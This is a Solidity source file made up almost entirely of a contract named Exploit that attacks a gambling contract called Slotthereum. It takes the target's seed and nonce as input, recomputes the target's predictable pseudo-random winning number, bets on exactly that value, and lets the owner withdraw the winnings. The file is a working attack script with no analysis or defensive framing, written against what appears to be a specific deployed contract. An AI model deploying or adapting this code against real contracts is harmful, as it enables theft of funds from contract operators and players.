1 // 109999999999999999 * 10 / 9 = x
2 
3 contract Slotthereum {
4     function placeBet(uint8 start, uint8 end) public payable returns (bool) {
5     }
6 }
7 
8 contract Exploit {
9     address owner;
10     Slotthereum target;
11     bytes32 seed;
12     uint nonce;
13     
14     function Exploit() {
15         owner = msg.sender;
16     }
17     
18     function attack(address a, bytes32 s, uint n) payable {
19         Slotthereum target = Slotthereum(a);
20         seed = s;
21         nonce = n;
22         uint8 win = getNumber();
23         target.placeBet.value(msg.value)(win, win);
24     }
25     
26     function () payable {
27         
28     }
29     
30     function withdraw() {
31         require(msg.sender == owner);
32         msg.sender.transfer(this.balance);
33     }
34     
35     function random(uint8 min, uint8 max) public returns (uint) {
36         nonce++;
37         return uint(keccak256(nonce, seed))%(min+max)-min;
38     }
39 
40     function random8(uint8 min, uint8 max) public returns (uint8) {
41         nonce++;
42         return uint8(keccak256(nonce, seed))%(min+max)-min;
43     }
44 
45     function newSeed() public {
46         seed = keccak256(nonce, seed, random(0, 255));
47     }
48 
49     function getNumber() public returns (uint8) {
50         newSeed();
51         return random8(0,9);
52     }
53 }